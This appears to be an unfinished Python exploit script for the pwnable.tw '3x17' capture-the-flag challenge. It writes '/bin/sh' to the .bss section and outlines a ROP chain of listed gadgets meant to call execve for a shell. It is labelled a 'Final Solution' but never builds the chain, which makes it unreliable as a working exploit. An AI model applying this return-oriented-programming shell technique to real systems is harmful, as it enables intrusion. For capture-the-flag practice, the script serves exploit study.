#!/usr/bin/env python3

import socket
import struct
import sys

def create_stack_based_rop():
    """Create a stack-based ROP chain"""
    
    print("=== Creating stack-based ROP chain ===")
    
    # The idea is to use the stack to pass arguments
    # We can write "/bin/sh" to the stack and then use gadgets that read from the stack
    
    # We found these useful gadgets:
    # 0x456e35: mov $0x3b,%esi  (sets esi to 59)
    # 0x40166a: mov %esi,%eax   (moves esi to eax, so rax = 59)
    # 0x4022b4: syscall         (executes syscall)
    
    # We also found gadgets that can set rdi to rsp
    # This means we can put "/bin/sh" on the stack and point rdi to it
    
    # And we found gadgets that can set rsi and rdx to 0
    
    print("Looking for stack-based gadgets...")
    
    # The challenge is that we only have 24 bytes to write
    # So we need to be very efficient
    
    # Let's try to find gadgets that can do multiple things at once
    # Or find a way to chain gadgets efficiently
    
    print("Looking for efficient gadgets...")

def try_complete_stack_exploit():
    """Try the complete stack-based exploit"""
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(("chall.pwnable.tw", 10105))
        
        print("\n=== Complete stack exploit attempt ===")
        print("Connected to challenge")
        
        # Read addr: prompt
        response = s.recv(1024).decode()
        print(f"Received: {response}")
        
        # Let's try to write to the .bss section first
        # We'll write "/bin/sh" there
        bss_addr = "0x4b92e0"
        
        s.send(bss_addr.encode() + b"\n")
        
        # Read data: prompt
        response = s.recv(1024).decode()
        print(f"Received: {response}")
        
        # Send "/bin/sh" + padding
        data = b"/bin/sh\x00" + b"A" * 16  # 24 bytes total
        s.send(data + b"\n")
        
        print("Wrote '/bin/sh' to .bss section")
        print("Connection should close now")
        
        s.close()
        
        # Now we need to find a way to overwrite the return address
        # with a ROP chain that sets up the registers correctly
        
        print("\nNote: We still need to find a way to overwrite the return address")
        print("with our ROP chain. The challenge is that we only have 24 bytes.")
        
    except Exception as e:
        print(f"Error: {e}")

def analyze_exploit_requirements():
    """Analyze what we need for the exploit"""
    
    print("\n=== Analyzing exploit requirements ===")
    
    # We need to:
    # 1. Write "/bin/sh" to memory (we can do this with the first write)
    # 2. Overwrite the return address with a ROP chain that:
    #    - Sets rdi to point to "/bin/sh"
    #    - Sets rsi to 0
    #    - Sets rdx to 0
    #    - Sets rax to 59 (execve syscall number)
    #    - Calls syscall
    
    # The challenge is that we only have 24 bytes for the second write
    # So we need to be very efficient with our ROP chain
    
    print("We need to fit a ROP chain in 24 bytes")
    print("Each address is 8 bytes, so we can have at most 3 gadgets")
    
    # We need to find a way to do this with only 3 gadgets
    # Or find gadgets that do multiple things at once
    
    print("Looking for efficient gadgets...")

def main():
    """Main function"""
    print("=== 3x17 Final Solution ===")
    
    create_stack_based_rop()
    analyze_exploit_requirements()
    try_complete_stack_exploit()

if __name__ == "__main__":
    import subprocess
    import re
    main()